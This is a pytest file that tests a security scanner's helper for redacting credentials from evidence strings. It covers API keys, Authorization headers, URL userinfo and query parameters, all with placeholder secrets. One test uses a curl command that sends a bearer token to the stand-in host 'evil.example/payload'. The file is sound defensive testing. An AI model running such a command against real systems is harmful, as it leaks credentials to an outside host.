"""Tests for scanner evidence redaction helpers."""

import pytest

from modelaudit.scanners._evidence_redaction import REDACTED_EVIDENCE_VALUE, redact_evidence_string


def test_redacts_compound_credential_assignments() -> None:
    """Compound credential keys should not preserve raw values."""
    text = (
        "client_secret=CLIENTSECRET123 "
        "refresh_token='REFRESHTOKEN456' "
        'access-token="ACCESSTOKEN789" '
        "aws_access_key_id=AWSACCESSKEY123 "
        "service-private-key=PRIVATEKEY000"
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "CLIENTSECRET123" not in redacted
    assert "REFRESHTOKEN456" not in redacted
    assert "ACCESSTOKEN789" not in redacted
    assert "AWSACCESSKEY123" not in redacted
    assert "PRIVATEKEY000" not in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"refresh_token='{REDACTED_EVIDENCE_VALUE}'" in redacted
    assert f'access-token="{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert f"aws_access_key_id={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"service-private-key={REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_quoted_key_credential_values() -> None:
    """JSON and Python dict style credential keys should not preserve raw values."""
    text = 'json={"api_key": "JSONSECRET123", "safe": "value"} config={\'client_secret\': \'PYSECRET456\'}'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "JSONSECRET123" not in redacted
    assert "PYSECRET456" not in redacted
    assert f'"api_key": "{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert f"'client_secret': '{REDACTED_EVIDENCE_VALUE}'" in redacted
    assert '"safe": "value"' in redacted


def test_redacts_quoted_key_values_with_escaped_delimiters() -> None:
    """Escaped quote delimiters should not leave credential suffixes behind."""
    text = r'json={"api_key": "abc\"TAILSECRET", "safe": "value"}'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "abc" not in redacted
    assert "TAILSECRET" not in redacted
    assert f'"api_key": "{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert '"safe": "value"' in redacted


def test_redacts_quoted_authorization_key_values() -> None:
    """Quoted Authorization headers should not preserve credential values."""
    text = (
        'headers={"Authorization": "Basic BASICSECRET123", '
        '"Proxy-Authorization": "Basic PROXYBASICSECRET123", "safe": "value"}'
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "BASICSECRET123" not in redacted
    assert "PROXYBASICSECRET123" not in redacted
    assert f'"Authorization": "{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert f'"Proxy-Authorization": "{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert '"safe": "value"' in redacted


def test_redacts_bare_quoted_authorization_values() -> None:
    """Bare Authorization assignments with quoted values should be redacted."""
    text = (
        'Authorization: "Bearer AUTHSECRET123" '
        'proxy_authorization="Basic PROXYAUTHSECRET123" '
        "proxy_authorization=Basic PROXYBARESECRET123; "
        'safe="value"'
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "AUTHSECRET123" not in redacted
    assert "PROXYAUTHSECRET123" not in redacted
    assert "PROXYBARESECRET123" not in redacted
    assert f'Authorization: "{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert f'proxy_authorization="{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert f"proxy_authorization={REDACTED_EVIDENCE_VALUE}" in redacted
    assert 'safe="value"' in redacted


def test_redacts_full_proxy_authorization_schemes() -> None:
    """Proxy authorization schemes should consume the full header value."""
    digest_secret = "PROXYDIGESTSECRET123"
    ntlm_secret = "PROXYNTLMSECRET123"

    redacted = redact_evidence_string(
        (
            f'proxy_authorization=Digest username="u", response="{digest_secret}"; '
            f"Proxy-Authorization: NTLM {ntlm_secret}; "
            'safe="value"'
        ),
        max_chars=500,
    )

    assert digest_secret not in redacted
    assert ntlm_secret not in redacted
    assert f"proxy_authorization={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Proxy-Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
    assert 'safe="value"' in redacted


def test_redacts_authorization_token_without_consuming_url_context() -> None:
    """Authorization redaction should preserve adjacent network indicators."""
    redacted = redact_evidence_string(
        'curl -H "Authorization: Bearer AUTHSECRET123" https://evil.example/payload',
        max_chars=500,
    )

    assert "AUTHSECRET123" not in redacted
    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "https://evil.example/payload" in redacted


def test_redacts_triple_quoted_key_values_atomically() -> None:
    """Triple-quoted Python credential values should be redacted as one value."""
    text = "{'api_key': '''TRIPLESECRET123''', 'safe': 'value'}"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "TRIPLESECRET123" not in redacted
    assert f"'api_key': '''{REDACTED_EVIDENCE_VALUE}'''" in redacted
    assert "'safe': 'value'" in redacted


def test_redacts_prefixed_python_string_values_for_quoted_keys() -> None:
    """Python string prefixes should still be treated as credential values."""
    text = "{'api_key': b'BYTESECRET123', 'private_key': rb'RAWSECRET456', 'safe': b'value'}"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "BYTESECRET123" not in redacted
    assert "RAWSECRET456" not in redacted
    assert f"'api_key': b'{REDACTED_EVIDENCE_VALUE}'" in redacted
    assert f"'private_key': rb'{REDACTED_EVIDENCE_VALUE}'" in redacted
    assert "'safe': b'value'" in redacted


def test_redacts_prefixed_quoted_assignments_without_second_pass_corruption() -> None:
    """Unquoted assignment redaction should not rewrite Python string prefixes."""
    text = 'api_key = f"FSECRET123" client_secret=b"BYTESECRET456" safe=f"value"'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "FSECRET123" not in redacted
    assert "BYTESECRET456" not in redacted
    assert f'api_key = f"{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert f'client_secret=b"{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert 'safe=f"value"' in redacted


def test_redacts_concatenated_python_credential_literals() -> None:
    """Adjacent Python string literals should be treated as one credential value."""
    assignment_tail = "ASSIGNMENTTAILSECRET"
    mapping_tail = "MAPPINGTAILSECRET"

    redacted = redact_evidence_string(
        f'api_key="sk-" "{assignment_tail}" config={{"client_secret": "cs-" "{mapping_tail}", "safe": "value"}}',
        max_chars=500,
    )

    assert assignment_tail not in redacted
    assert mapping_tail not in redacted
    assert f'api_key="{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert f'"client_secret": "{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert '"safe": "value"' in redacted


def test_redacts_escaped_sensitive_mapping_keys() -> None:
    """Escaped credential key names should be decoded before matching."""
    unicode_secret = "UNICODEKEYSECRET"
    hex_secret = "HEXKEYSECRET"

    redacted = redact_evidence_string(
        f"json={{\"api\\u005fkey\": \"{unicode_secret}\"}} config={{'client\\x5fsecret': '{hex_secret}'}}",
        max_chars=500,
    )

    assert unicode_secret not in redacted
    assert hex_secret not in redacted
    assert f'"api\\u005fkey": "{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert f"'client\\x5fsecret': '{REDACTED_EVIDENCE_VALUE}'" in redacted


def test_redacts_sensitive_call_and_container_assignment_values() -> None:
    """Sensitive assignments should consume call and container-shaped values."""
    call_secret = "CALLSECRET123"
    list_secret = "LISTSECRET123"
    unbalanced_secret = "UNBALANCEDSECRET123"

    redacted = redact_evidence_string(
        (
            f'api_key=SecretStr("{call_secret}") '
            f'client_secret=["{list_secret}"] '
            f'private_key=SecretStr("{unbalanced_secret}" safe=value'
        ),
        max_chars=500,
    )

    assert call_secret not in redacted
    assert list_secret not in redacted
    assert unbalanced_secret not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"private_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "safe=value" not in redacted


def test_redacts_unterminated_prefixed_quoted_assignments() -> None:
    """Truncated snippets should still fail closed for prefixed quoted credentials."""
    text = 'api_key=f"TRUNCATEDSECRET123 requests.get'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "TRUNCATEDSECRET123" not in redacted
    assert f'api_key=f"{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert "requests.get" not in redacted


def test_redacts_unterminated_multiword_quoted_assignments() -> None:
    """Truncated quoted assignments should consume multi-word secret suffixes."""
    redacted = redact_evidence_string('api_key="BEGIN PRIVATE KEY', max_chars=500)

    assert "BEGIN" not in redacted
    assert "PRIVATE KEY" not in redacted
    assert redacted == f'api_key="{REDACTED_EVIDENCE_VALUE}"'


@pytest.mark.parametrize(
    ("text", "secret"),
    [
        ('json={"api_key": "JSONTRUNCATEDSECRET', "JSONTRUNCATEDSECRET"),
        ("config={'client_secret': 'PYTRUNCATEDSECRET", "PYTRUNCATEDSECRET"),
        ('headers={"Authorization": "Basic AUTHTRUNCATEDSECRET', "AUTHTRUNCATEDSECRET"),
    ],
)
def test_redacts_unterminated_quoted_key_values(text: str, secret: str) -> None:
    """Truncated quoted-key values should fail closed without preserving suffixes."""
    redacted = redact_evidence_string(text, max_chars=500)

    assert secret not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


def test_redacts_unterminated_bare_quoted_authorization_values() -> None:
    """Truncated bare Authorization values should fail closed for Basic credentials."""
    redacted = redact_evidence_string('Authorization: "Basic AUTHTRUNCATEDSECRET', max_chars=500)

    assert "AUTHTRUNCATEDSECRET" not in redacted
    assert redacted == f'Authorization: "{REDACTED_EVIDENCE_VALUE}"'


def test_redacts_compound_sensitive_query_parameters() -> None:
    """Compound query credential keys should be redacted in URL evidence."""
    text = (
        "url=https://example.com/callback?client_secret=CLIENTSECRET123&refresh_token=REFRESHTOKEN456"
        "&aws_access_key_id=AWSACCESSKEY789&ok=1;authorization=AUTHQUERYSECRET&token=SEMICOLONSECRET"
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "CLIENTSECRET123" not in redacted
    assert "REFRESHTOKEN456" not in redacted
    assert "AWSACCESSKEY789" not in redacted
    assert "AUTHQUERYSECRET" not in redacted
    assert "SEMICOLONSECRET" not in redacted
    assert "client_secret=<redacted>" in redacted
    assert "refresh_token=<redacted>" in redacted
    assert "aws_access_key_id=<redacted>" in redacted
    assert "authorization=<redacted>" in redacted
    assert "token=<redacted>" in redacted
    assert "ok=1" in redacted


def test_redacts_userinfo_for_generic_url_schemes() -> None:
    """Credential-bearing URLs should redact userinfo across schemes."""
    ssh_secret = "SSHSECRET123"
    postgres_secret = "POSTGRESSECRET123"

    redacted = redact_evidence_string(
        f"ssh://user:{ssh_secret}@example.test/path postgres://user:{postgres_secret}@example.test/db",
        max_chars=500,
    )

    assert ssh_secret not in redacted
    assert postgres_secret not in redacted
    assert "ssh://<credentials-redacted>@example.test/path" in redacted
    assert "postgres://<credentials-redacted>@example.test/db" in redacted


def test_redacts_malformed_userinfo_url() -> None:
    """Malformed userinfo URLs should fail closed instead of returning raw evidence."""
    text = "download=https://user:LEAKY-PASS@[::1/path?token=QUERYSECRET"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "user:LEAKY-PASS" not in redacted
    assert "QUERYSECRET" not in redacted
    assert "https://<credentials-redacted>@[::1/path" in redacted


def test_existing_token_assignment_redaction_still_applies() -> None:
    """Canonical token assignments should keep their existing redaction behavior."""
    redacted = redact_evidence_string("token=CANONICALTOKEN123", max_chars=500)

    assert "CANONICALTOKEN123" not in redacted
    assert redacted == f"token={REDACTED_EVIDENCE_VALUE}"
